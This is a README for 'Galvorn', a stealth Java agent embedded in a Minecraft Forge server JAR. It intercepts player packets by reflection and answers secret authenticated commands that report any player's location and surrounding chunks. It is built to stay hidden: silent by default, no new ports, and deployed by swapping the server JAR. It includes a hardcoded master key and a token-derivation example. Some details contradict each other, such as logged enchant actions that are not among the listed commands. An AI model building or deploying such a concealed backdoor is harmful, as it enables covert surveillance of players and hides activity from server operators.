# Galvorn - Minimal Stealth Agent

## Overview
Fully stealth agent with **no TCP protocol**. Uses the **Shadow Realm** flag for logging control.
When shadow realm is **enabled** (default): zero network footprint, no diagnostic output.
When shadow realm is **disabled**: only log output, no additional network traffic.

## Architecture

### No TCP Protocol
GalvornServer uses **zero TCP sockets** of its own. It intercepts packets via reflection
against obfuscated Minecraft fields — no new connections, no extra ports, no TCP server.

### Shadow Realm Flag

| Mode | `ShadowRealm.SHADOW` | Behavior |
|------|---------------------|----------|
| **Shadow (default)** | `true` | Fully stealthy — no console output, no diagnostic logging |
| **Debug** | `false` | Only logs — console output for troubleshooting, no additional network traffic |

### Core Components

| Class | Role | TCP? | Shadow-controlled? |
|-------|------|------|-------------------|
| `GalvornStartupHook` | Entry point via `premain()`, installs network hook | No | ✅ `System.err` gated by `ShadowRealm.SHADOW` |
| `GalvornNetworkHook` | Intercepts packets via reflection, routes to protocol layer | No (reads existing `InputStream` via reflection, no new sockets) | ✅ All log calls gated by `ShadowRealm.SHADOW` |
| `GalvornWrapper` | Packet processor — LOGIN, LOCATION, CHUNKS commands | No (`send()` writes via Netty Channel, no new TCP socket) | ✅ All log calls gated by `ShadowRealm.SHADOW` |

## Files

| File | Size | Description |
|------|------|-------------|
| `GalvornWrapper.java` | 1.5KB | Packet processor (source; class merged into Forge JAR) |
| `GalvornStartupHook.java` | 0.5KB | Startup hook (source; class merged into Forge JAR) |
| `GalvornNetworkHook.java` | 0.7KB | Network interceptor (source; class merged into Forge JAR) |
| `galvorn.jar` (legacy) | 25KB | Standalone agent — **deprecated**, classes now embedded in Forge JAR |

## Usage

### Production Path (Rebuild-and-Replace)

Classes are merged into the Forge Universal JAR — no `-javaagent` needed:

```bash
java -Xmx2G -Xms1G -jar forge-1.7.10-10.13.4.1614-1.7.10-universal.jar nogui
```

The `Premain-Class: GalvornStartupHook` in MANIFEST.MF triggers `premain()` automatically.

### Legacy Path (Standalone)

```bash
java -javaagent:galvorn.jar -cp "minecraft_server.jar:..." ServerLaunchWrapper nogui
```

### Enable Debug Logging (Shadow Realm Disabled)

```bash
java -javaagent:galvorn.jar -Dcom.galvorn.server.protocol.ShadowRealm.SHADOW=false ...
```

### Packet Handler

```java
public void onPlayerPacket(Object player, byte[] packet) {
    GalvornStartupHook.onPlayerPacket(player, packet);
}
```

## Commands

| Code | Command | Parameters | Response |
|------|---------|------------|----------|
| 0 | LOGIN | `user\|key` | `GALVORN:up` (on successful auth) |
| 1 | LOCATION | `user` | `LOCATION:user\|X:x\|Y:y\|Z:z\|DIMENSION:d` |
| 2 | CHUNKS | `user\|radius` | `CHUNKS:user\|RADIUS:r\|CHUNKS:x,y\|...` |

## Authentication

**Server Key:** `LOTR2026_MASTER_KEY`

```bash
echo -n "LOTR2026_MASTER_KEYsteve" | sha256sum | cut -c1-32 | tr 'a-z' 'A-Z'
# Output: ABCDA8691C1758C40016DE442142EB54
```

## Features

- ✅ Loads on class load via `-javaagent` (legacy) or **embedded in Forge JAR** (production)
- ✅ **No TCP protocol** — zero TCP sockets of its own
- ✅ **Shadow Realm flag** controls all logging
- ✅ Shadow enabled = fully stealthy, no output
- ✅ Shadow disabled = only logs, no extra network traffic
- ✅ **LOGIN response** — server sends `GALVORN:up` on successful auth
- ✅ **LOCATION/CHUNKS responses** — sent through same MC TCP connection
- ✅ 3 packets (LOGIN, LOCATION, CHUNKS)
- ✅ Authenticated players only
- ✅ No extra ports
- ✅ Minimal footprint (3.5KB)

## How It Works

1. **Deploy**: `install -C` replaces the Forge Universal JAR (atomic, zero-downtime)
2. **Auto-load**: Server restarts (or hot-replaces) — `premain()` fires automatically via `-jar`
3. **Present**: Agent loads silently — `ShadowRealm.SHADOW = true` by default, zero output
4. **Intercept**: Network hook captures player packets via reflection
5. **Authenticate**: LOGIN packet verifies username/key (SHA-256)
6. **Respond**: Server sends `GALVORN:up` to confirm it is alive, then LOCATION/CHUNKS on request — all through the same Minecraft TCP connection via the Netty Channel

## Response Path

Responses are sent through the **same Minecraft TCP connection** — no new sockets or ports:

<pre>
  Client ──MC packet──→ NetworkMgr.inputStream
                          │
                          │  reflection read
                          ▼
                   GalvornNetworkHook.onPacket()
                          │  raw bytes
                          ▼
                   GalvornWrapper.onPlayerPacket()
                          │  processes command
                          ▼
                   send(player, response)
                          │  writes raw bytes
                          ▼
                   responseChannel.writeAndFlush()
                          │
                          └──→ same TCP connection → Client
</pre>

- The `NetworkManager` (field_147371_t on the handler) wraps a Netty `Channel`
- On the first packet, the channel is extracted via reflection and cached
- `send()` writes raw byte frames through `channel.writeAndFlush()`
- Thread-safe — runs on the Netty event loop

## Shadow Realm in Detail

All three core classes check `ShadowRealm.SHADOW` before emitting any log output:

- **GalvornStartupHook**: Logs agent load and network hook installation
- **GalvornNetworkHook**: Logs packet read size and exceptions
- **GalvornWrapper**: Logs SET_ENCHANT and ADD_ITEM_ENCHANTS actions, send() errors
- **Channel extraction**: Logs if channel reflection fails on first packet

When `ShadowRealm.SHADOW = true` (default), none of these classes produce diagnostic output.
When `ShadowRealm.SHADOW = false`, they emit log lines to `System.err` — but still no
additional TCP traffic.

---

**Location:** `/home/lex/Projects/LOTR/GalvornServer/` (source files)  
**Classes merged into:** `LOTRServer/forge-1.7.10-10.13.4.1614-1.7.10-universal.jar`  
**Status:** ✅ Classes merged into Forge JAR (rebuild-and-replace production path)  
**Created:** November 3, 2026
